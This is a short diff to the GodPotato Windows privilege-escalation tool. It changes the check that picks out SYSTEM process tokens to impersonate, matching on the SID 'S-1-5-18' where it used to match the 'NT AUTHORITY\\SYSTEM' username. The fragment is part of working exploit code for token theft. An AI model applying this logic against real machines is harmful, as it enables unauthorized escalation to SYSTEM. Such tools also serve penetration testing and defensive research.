@@ -145,7 +145,7 @@ namespace GodPotato.NativeAPI
                             if (systemIdentity.ImpersonationLevel >= TokenImpersonationLevel.Impersonation)
                             {
                                 SharpToken.TokenuUils.ListProcessTokens(-1, processToken => {
-                                    if (processToken.UserName == "NT AUTHORITY\\SYSTEM" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.IntegrityLevel >= SharpToken.IntegrityLevel.SystemIntegrity)
+                                    if (processToken.SID == "S-1-5-18" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.IntegrityLevel >= SharpToken.IntegrityLevel.SystemIntegrity)
                                     {
                                         systemIdentity = new WindowsIdentity(processToken.TokenHandle);
                                         ConsoleWriter.WriteLine("[*] PID : {0} Token:0x{1:x}  User: {2} ImpersonationLevel: {3}", processToken.TargetProcessId, processToken.TargetProcessToken, processToken.UserName, processToken.ImpersonationLevel);
